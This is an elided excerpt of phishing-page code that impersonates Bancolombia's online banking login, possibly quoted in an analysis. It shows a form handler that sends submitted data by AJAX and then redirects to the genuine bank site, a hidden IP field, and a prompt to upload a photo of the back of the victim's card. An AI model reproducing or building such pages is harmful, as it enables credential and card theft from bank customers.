 ...
 $(document).on("submit", "form", function (event) {
     ...
     $.ajax({
         ...
         success: function (data, status) {
             location.href ="https://www.bancolombia.com/personas";
         },
     });
 });
</script> 
...
<input type="text" name="caption" id="ipaddress" hidden="">
            ...
            <div id="dimmer">
               <div id="ctl00_MainHolder_loginPanel" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'ctl00_MainHolder_loginButton')">
                  <div class="contenedor_ingresar subtabla-login">
                     <div class="data">
                        <ul class="medio">
                           <li class="medio titulo"> Validación a TuB@nco Personas&nbsp;</li>
                           <li class="medio">
                              <div class="datos">
 ...
 <label tabindex="0" for="my-file" style="width: 200px;" class="input-file-trigger">Escanea la parte trasera de tu tarjeta Bancolombia : <strong>Click aquí para escanear Foto/Subir Archivo</strong> </label>
